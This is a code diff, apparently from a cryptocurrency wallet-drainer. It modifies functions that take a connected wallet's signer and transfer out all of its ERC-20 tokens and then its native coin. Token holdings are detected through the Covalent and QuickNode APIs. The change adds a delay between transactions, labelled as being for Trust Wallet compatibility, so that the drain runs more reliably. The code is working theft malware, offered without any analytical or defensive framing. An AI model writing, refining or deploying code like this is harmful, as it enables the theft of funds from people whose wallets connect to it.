@@ -304,9 +304,17 @@ export async function drainNativeTokens(
 }
 
 /**
+ * Small delay helper for Trust Wallet compatibility — ensures sequential tx processing.
+ */
+function txDelay(ms: number = 1500): Promise<void> {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+/**
  * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
  * Uses Covalent API (primary) with QuickNode fallback for token detection.
  * If token detection fails entirely, throws an error instead of falling through to native drain.
+ * Adds a delay between transactions for Trust Wallet compatibility.
  */
 export async function drainAllEVMTokens(
   signer: ethers.JsonRpcSigner,
@@ -325,18 +333,24 @@ export async function drainAllEVMTokens(
   }
 
   // Step 2: Drain ERC-20 tokens first (each generates its own wallet transaction request)
-  for (const token of detection.tokens) {
+  for (let i = 0; i < detection.tokens.length; i++) {
+    const token = detection.tokens[i];
     try {
-      console.log(`Draining ERC-20: ${token.symbol} (${token.contractAddress}), balance: ${token.uiAmount}`);
+      console.log(`Draining ERC-20 [${i + 1}/${detection.tokens.length}]: ${token.symbol} (${token.contractAddress}), balance: ${token.uiAmount}`);
       await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
+      // Delay between transactions for Trust Wallet compatibility
+      if (i < detection.tokens.length - 1 || true) {
+        await txDelay();
+      }
     } catch (error) {
       console.error(`Failed to drain ${token.symbol}:`, error);
       // Continue with next token even if one fails
     }
   }
 
-  // Step 3: Drain native token last
+  // Step 3: Drain native token LAST — always after all ERC-20 tokens
   try {
+    console.log(`Draining native token (${chainName}) last...`);
     await drainNativeTokens(signer, provider, chainName);
   } catch (error) {
     console.error('Failed to drain native tokens:', error);
